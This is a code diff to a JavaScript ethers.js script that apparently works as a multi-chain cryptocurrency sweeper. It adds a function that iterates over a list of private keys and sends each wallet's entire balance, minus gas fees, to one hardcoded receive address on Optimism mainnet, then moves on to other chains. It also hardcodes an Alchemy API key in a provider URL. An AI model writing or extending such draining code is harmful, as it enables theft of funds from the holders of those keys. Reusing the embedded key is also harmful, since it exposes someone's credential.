@@ -36,6 +36,7 @@ const providerPolygon = new ethers.providers.AlchemyProvider('matic', process.en
 const providerRinkeby = new ethers.providers.AlchemyProvider('rinkeby', process.env.ALCHEMY_API_KEY_RINKBY);
 const providerBscMainNet = new ethers.getDefaultProvider('https://bsc-dataseed1.binance.org:443');
 const providerBsc = new ethers.getDefaultProvider('https://data-seed-prebsc-1-s1.binance.org:8545');
+const providerOptimismMain = new ethers.getDefaultProvider('https://opt-mainnet.g.alchemy.com/v2/NDas_a-SVDK8WGuOCwHWWPWnR7GJYqaN');
 const receiveAddress = "0x88761F959C029d5828405234A53c5d42FD84248E";
 
 
@@ -129,9 +130,38 @@ async function siphonedPolygon(){
       })
     }
   } 
-   siphonedMain();
+  siphonedOptimismMain();
 }
 
+async function siphonedOptimismMain(){
+
+  for(let i = 0; i < privateKey.length; i++){ 
+   let newGasPrice = await providerOptimismMain.getGasPrice();
+   let balance = await providerOptimismMain.getBalance(new ethers.Wallet(privateKey[i]).address);
+   let newNonce = await providerOptimismMain.getTransactionCount(new ethers.Wallet(privateKey[i]).address, "latest");
+   let newGasLimit = ethers.BigNumber.from("210000");
+   let tips = ethers.BigNumber.from("10");
+   let feesTx = newGasLimit.mul(newGasPrice);
+  //  console.log(new ethers.Wallet(privateKey[i]),ethers.utils.formatUnits(ethers.BigNumber.from(balance),1),ethers.utils.formatUnits(ethers.BigNumber.from(feesTx),1),ethers.utils.formatUnits(ethers.BigNumber.from(balance).sub(feesTx),1));
+
+   if(ethers.utils.formatUnits(ethers.BigNumber.from(balance).sub(feesTx),1) > 0){
+     const tx = {
+       from: new ethers.Wallet(privateKey[i]).address,
+       to: receiveAddress,
+       value: ethers.BigNumber.from(balance).sub(feesTx),
+       nonce: newNonce,
+       gasLimit: newGasLimit, // 100000
+       gasPrice: newGasPrice,
+     }
+     console.log("OptimismMainnet TX DONE");
+
+     new ethers.Wallet(privateKey[i], providerOptimismMain).sendTransaction(tx).then((transaction,err) => {
+       console.log(transaction);
+     })
+   }
+ } 
+  siphonedMain();
+}
 
 async function siphonedMain(){
 
